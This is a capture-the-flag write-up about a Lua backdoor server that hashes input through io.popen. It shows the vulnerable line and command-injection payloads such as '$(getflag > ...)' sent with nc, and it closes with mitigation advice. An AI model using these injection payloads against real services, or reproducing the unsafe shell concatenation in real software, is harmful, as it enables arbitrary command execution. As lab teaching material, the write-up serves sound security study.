### 🧾 Challenge Overview

> **"There is a backdoor process listening on port 50001."**  
> You're provided with a Lua script (`level12.lua`) that implements a TCP server. It waits for a "password" input, hashes it using SHA1, and compares it to a known hash to return the flag.

---

### 🔬 Vulnerable Code

```lua
prog = io.popen("echo "..password.." | sha1sum", "r")
```

🚨 **Vulnerability Type:** Shell Command Injection

#### 🔍 Why it's dangerous:

- `password` is inserted **directly** into a shell command
    
- No input sanitization or escaping
    
- `io.popen()` behaves like `system()` — it invokes the shell
    
- This allows arbitrary command execution via crafted inputs like `$(...)`
    

---

### 💥 Exploitation Strategy

We’ll inject a malicious command to **run arbitrary shell code as `flag12`** and dump the output into a file we can later read.

---

### 🧪 Step-by-Step Exploit

#### ✅ Confirm code execution:

Connect to the backdoor:

```bash
nc 127.0.0.1 50001
```

Send:

```
Password: $(whoami > /home/flag12/output)
```

Now read the file:

```bash
cat /home/flag12/output
# Output: flag12
```

🎉 **Proof of code execution as `flag12`** confirmed.

---

#### 🏁 Get the Flag

Use the same trick to execute `getflag`:

```bash
nc 127.0.0.1 50001
```

Send:

```
Password: $(getflag > /home/flag12/flag.txt)
```

Then read it:

```bash
cat /home/flag12/flag.txt
# Output: You have successfully executed getflag on a target account
```

---

### 🛡️ Lessons Learned

This level demonstrates how even a **high-level scripting language like Lua** can be just as dangerous when user input is passed to shell commands.

#### 🔒 Mitigation Tips:

- Never use `io.popen()` or `os.execute()` with raw user input
    
- If shell commands must be used, always escape or validate inputs
    
- Better: Use language-native cryptographic libraries and avoid invoking the shell altogether

### 🏆 Final Flag

```
You have successfully executed getflag on a target account
```
